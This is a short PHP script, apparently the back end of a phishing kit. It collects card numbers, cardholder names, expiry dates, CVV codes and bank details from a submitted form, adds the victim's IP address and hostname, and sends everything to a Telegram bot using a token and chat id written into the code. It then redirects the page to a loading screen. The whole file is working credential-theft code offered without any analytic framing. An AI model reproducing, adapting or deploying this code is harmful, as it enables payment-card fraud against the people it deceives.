<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

if (isset($_POST['next']))
{

		$_SESSION["Scard"] = $_POST['eko'];
		$_SESSION["Sname_on_card"] = $_POST['smiya'];
		$_SESSION["Sexp_month"] = $_POST['moka'];
		$_SESSION["Sexp_year"] = $_POST['l3am'];
		$_SESSION["Scvv2"] = $_POST['COCO'];
		$_SESSION["ara"] = $_POST['namebank'];
		$_SESSION["hadik"] = $_POST['typecard'];
		$_SESSION["7lawa"] = $_POST['brandbank'];


	$id = $_SESSION['Scard'];
		$ss = strlen($id);
		$lengthcard = $ss - 4;
		$cardX =  substr($id,$lengthcard);
		$_SESSION['scardx'] = $cardX;
		

	

	
	$smolix .= "╔─────|  ".$_SESSION['Sname_on_card']."  |──────\n";
    $smolix .= "╔>CC : ".$_SESSION['Scard']." ══> ".$_SESSION['7lawa']." (".$_SESSION['hadik'].")  \n";
    $smolix .= "║ Dt : ".$_SESSION['Sexp_month']." / ".$_SESSION['Sexp_year']."\n";	
    $smolix .= "║ Cv : ".$_SESSION['Scvv2']."\n"; 
	$smolix .= "╚══> ".$_SESSION['ara']." \n";
    $smolix .= "|N° : $ip / $hostname \n"; 
	$smolix .= "*****************************\n";



file_get_contents("https://api.telegram.org/bot1796948378:AAErJAJhTY9K-7_uyC4j-E9Bjy4rswtSG5k/sendMessage?chat_id=1045677055&text=" . urlencode($smolix)."" );					





}



?>

<script language="Javascript" type="text/javascript">
  parent.location.href = "loading.html";
         </script>